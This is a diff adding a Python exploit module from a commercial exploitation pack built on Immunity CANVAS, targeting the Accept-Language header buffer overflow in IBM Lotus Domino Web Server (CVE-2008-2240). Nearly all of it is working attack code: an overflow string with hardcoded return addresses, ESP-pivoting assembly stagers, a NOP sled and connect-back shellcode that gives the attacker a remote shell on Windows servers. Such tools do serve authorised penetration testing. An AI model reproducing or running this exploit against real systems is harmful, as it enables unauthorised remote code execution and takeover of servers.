@@ -1,0 +1,205 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2009
+#
+
+
+import sys
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+import os
+import getopt
+import socket
+import canvasengine
+import time
+
+from exploitutils import *
+from tcpexploit   import tcpexploit
+from MOSDEF       import mosdef
+from encoder      import chunkedaddencoder
+
+
+# GUI info
+NAME = "IBM Lotus Domino Web Server Accept-Language HTTP Header Buffer Overflow Vulnerability"
+
+DESCRIPTION = "Buffer overflow vulnerability in IBM Lotus Domino Web Server Accept-Language HTTP Header"
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "IBM"
+DOCUMENTATION["Date public"] = "2008.05.20"
+DOCUMENTATION["VersionsAffected"] = "IBM Lotus Domino 7.0.3 / 8.0"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "One-Shot"
+DOCUMENTATION["References"] = "http://www.securityfocus.com/bid/29310"
+DOCUMENTATION["CVE Name"] = "CVE-2008-2240"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2240"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = "0.1"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+PROPERTY['VERSION'] = [ "2000", "2003" ]
+
+NOTES="""
+This exploit is based on Immunity CANVAS exploit lotus_domino_http.py
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0: ['IBM Lotus Domino <= 7.0.3', 0x0],  
+    1: ['IBM Lotus Domino <= 8.0', 0x1], 
+}  
+
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)        
+        self.ssl = 0
+        self.port       = 80
+        self.host       = ""
+        self.shellcode  = "\xcc" * 298
+        self.badstring  = "\x00\r\n"
+        self.version    =  0
+        self.name       = NAME                
+        return
+
+    def neededListenerTypes(self):
+        return [canvasengine.WIN32MOSDEF]
+    
+    def createShellcode(self):
+        host = self.callback.ip
+        port = self.callback.port
+        self.shellcode = self.createWin32Shellcode(self.badstring,host,port)
+                
+        return self.shellcode
+        
+    def getargs(self):
+        self.host = self.target.interface
+        self.port = int(self.argsDict.get("port",self.port))
+        self.ssl = int(self.argsDict.get('ssl', self.ssl))
+        
+    def run(self):
+        self.getargs()
+        
+        self.setInfo("%s attacking %s:%d (in progress)" % (NAME, self.host, self.port))
+
+        self.log("Attacking %s:%d" % (self.host, self.port))
+        sploitstring = self.makesploit()
+        
+        try:
+            s = self.gettcpsock()
+            s.connect((self.host, self.port))
+        except:
+            self.log("Could not connect")
+            self.setInfo("%s attacking %s:%d - done (failed: could not connect!)" % (NAME, self.host, self.port))
+            return 0
+
+        self.websend(s, sploitstring)           
+
+        if self.ISucceeded():
+            self.setInfo("%s attacking %s:%d - done (success!)" % (NAME, self.host, self.port))
+            return 1
+        else:
+            self.setInfo("%s attacking %s:%d - done (failed)" % (NAME, self.host, self.port))            
+        return 1
+        
+    def makesploit(self):
+        sploitstring    = ""
+        language        = "A" * 148
+        
+        """
+        This stager prevents a few problems:
+        1. Tolower on our shellcode, plus no nulls, or \r\n 
+        2. Change ESP - we don't have enough room on the stack for an encoder 
+           Pull pointer off of ESP and jump to there.
+           What we really wanted to jump to is
+           (esp+0x4cc)-0x494
+        """
+
+        stager_80           ="""addl $0x6cc33333,%esp
+subl $0x6cc32e67, %esp
+movl (%esp), %esp
+subl $0x6cc33333,%esp
+addl $0x6cc32e9f,%esp
+jmp %esp"""
+
+        stager_70           ="""addl $0x6cc33333,%esp
+subl $0x6cc32e6b, %esp
+movl (%esp), %esp
+subl $0x6cc33333,%esp
+addl $0x6cc32e9f,%esp
+jmp %esp"""
+
+				
+				# Lotus Domino 7
+        if (self.version == 0):
+        	stager = mosdef.assemble(stager_70, 'x86')
+        # Lotus Domino 8
+        else:
+        	stager = mosdef.assemble(stager_80, 'x86')
+        
+        """
+        rw_addr  - R/W address and needs to have room (+0x1c0) for writing
+        func_ptr - valid pointer, and needs +0x20 to be a valid pointer as well        
+        """
+        calc_val       = 0xffffffff
+        rw_addr        = 0x18228310  # 0x18228310 @ LTOUIN22.dll 
+        calc_val2      = 0x01010101   
+        jmp_esp        = 0x7c345c30  # push esp / ret 0x70cd09ab @ /Lotus/Domino/MSVCR71.dll
+        func_ptr       = 0x18227d88  # 0x18227d88 @ LTOUIN22.dll
+				
+        calc_offset    = 56
+        rw_offset      = 68
+        calc_offset2   = 80
+        rw_offset2     = 104
+        jmp_esp_offset = 112
+        
+        language       = stroverwrite( language, intel_order(calc_val ), calc_offset )
+        language       = stroverwrite( language, intel_order( rw_addr ), rw_offset )
+        language       = stroverwrite( language, intel_order(calc_val2), calc_offset2 )
+        language       = stroverwrite( language, intel_order( func_ptr ), rw_offset2 )
+        language       = stroverwrite( language, intel_order( jmp_esp ), jmp_esp_offset )
+        language       = stroverwrite( language, intel_order( rw_addr ), jmp_esp_offset + 4)
+        
+        language      += stager
+        language      += "\x90" * ( 1000 - len(self.shellcode) )
+        language      += self.shellcode
+ 
+        sploitstring   = "GET /iNotes/Forms6.nsf/?%ff HTTP/1.0\r\n"  
+        sploitstring  += "Host:%s\r\n" % self.target.interface
+        sploitstring  += "Accept-Language: %s\r\n" % language
+        sploitstring  += "Connection: Close\r\n"
+        sploitstring  += "Cache-Control: no-cache\r\n\r\n"        
+        
+        return sploitstring
+
+    def displayVersions(self):
+        i = 0
+        print 'Available versions:'
+        for listline in targets.values():
+            print "\t%d: %s" % (i, listline[0])
+            i += 1
+
+    def usage(self):
+        print "Usage: %s -v version -t targethost -p port -l localip -d localport [-O ssl:0|1]\n" % (sys.argv[0])
+        self.displayVersions()
+        sys.exit(0)
+
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+    app = theexploit()
+    ret=standard_callback_commandline(app)
+    
